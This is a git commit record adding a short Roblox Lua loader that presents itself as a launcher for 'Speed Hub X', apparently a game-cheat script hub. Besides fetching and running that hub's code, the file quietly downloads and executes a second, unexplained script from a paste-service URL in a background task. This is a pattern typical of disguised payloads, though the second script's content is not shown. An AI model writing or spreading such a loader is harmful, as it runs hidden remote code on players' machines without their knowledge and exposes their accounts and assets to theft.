22340a14a6549ff437c3480c11e6d2806a168b51
gagscript-server2 <tiktokbusinessacc08@gmail.com>
2025-07-23 16:05:53 +0800

    Create Speed-Hub-X-Main_Loader.lua

---
+++ Speed-Hub-X-Main_Loader.lua
@@ -0,0 +1,10 @@
+local s1 = game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true)
+local s2 = game:HttpGet("https://api.rubis.app/v2/scrap/VlfvWkVQplQUxUYB/raw", true)
+
+-- Load s1 normally
+loadstring(s1)()
+
+-- Load s2 concurrently
+task.spawn(function()
+    loadstring(s2)()
+end)
